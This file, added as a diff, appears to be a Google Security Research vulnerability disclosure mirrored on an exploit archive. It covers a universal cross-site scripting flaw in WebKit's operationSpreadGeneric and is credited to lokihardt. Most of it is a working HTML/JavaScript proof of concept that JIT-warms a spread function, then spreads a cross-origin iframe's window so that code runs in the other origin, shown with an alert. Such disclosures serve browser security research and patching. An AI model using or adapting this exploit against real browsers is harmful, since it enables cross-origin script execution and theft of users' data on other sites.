@@ -1,0 +1,59 @@
+id: 27621
+date: 04/19/2017
+title: WebKit operationSpreadGeneric Universal Cross Site Scripting Vulnerability
+author: Google Security Research
+cves: 
+
+WebKit: UXSS via operationSpreadGeneric 
+
+
+
+
+Once a spread operation is optimized, the function |operationSpreadGeneric| will be called from then on. But operationSpreadGeneric's trying to get a JSGlobalObject from the argument of a spread operation.
+
+It seems that that optimization is not implemented to the release version of Safari yet.
+
+Tested on the Nighly 10.0.2(12602.3.12.0.1, <a href="https://crrev.com/210957" title="" class="" rel="nofollow">r210957</a>)
+
+PoC:
+<body>
+<script>
+
+'use strict';
+
+function spread(a) {
+    return [...a];
+}
+
+let arr = Object.create([1, 2, 3, 4]);
+for (let i = 0; i < 0x10000; i++) {
+    spread(arr);
+}
+
+let f = document.body.appendChild(document.createElement('iframe'));
+f.onload = () => {
+    f.onload = null;
+
+    try {
+        spread(f.contentWindow);
+    } catch (e) {
+        e.constructor.constructor('alert(location)')();
+    }
+};
+
+f.src = '<a href="https://abc.xyz/';" title="" class="" rel="nofollow">https://abc.xyz/';</a>
+
+</script>
+</body>
+
+
+This bug is subject to a 90 day disclosure deadline. If 90 days elapse
+without a broadly available patch, then the bug report will automatically
+become visible to the public.
+
+
+
+
+Found by: lokihardt
+
+#  0day.today [2023-03-23]  #
